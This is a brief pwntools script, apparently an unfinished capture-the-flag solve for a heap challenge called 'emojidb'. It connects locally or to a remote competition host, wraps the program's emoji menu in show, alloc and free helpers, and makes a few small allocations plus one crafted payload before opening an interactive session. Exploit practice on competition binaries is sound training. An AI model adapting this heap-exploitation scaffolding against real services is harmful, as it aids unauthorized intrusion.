from pwn import *

e = ELF("./emojidb")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("emojidb.pwni.ng", 9876)
else:
  p = process(e.path)

qs = "\xe2\x9d\x93"

def show(idx):
  p.sendafter(qs, "\xf0\x9f\x93\x96")
  p.sendlineafter(qs, str(idx))

  leak = p.recvuntil(qs)
  print(leak)

def alloc(size, pay="A"):
  p.sendafter(qs, "\xf0\x9f\x86\x95")
  p.sendlineafter(qs, str(size) + pay)
  
def free(idx):
  p.sendafter(qs, "\xf0\x9f\x86\x93")
  p.sendlineafter(qs, str(idx))

  p.recvuntil(qs)


alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
debug()
alloc(0x10, "\xf0\x9f\x83\x23")


p.interactive()
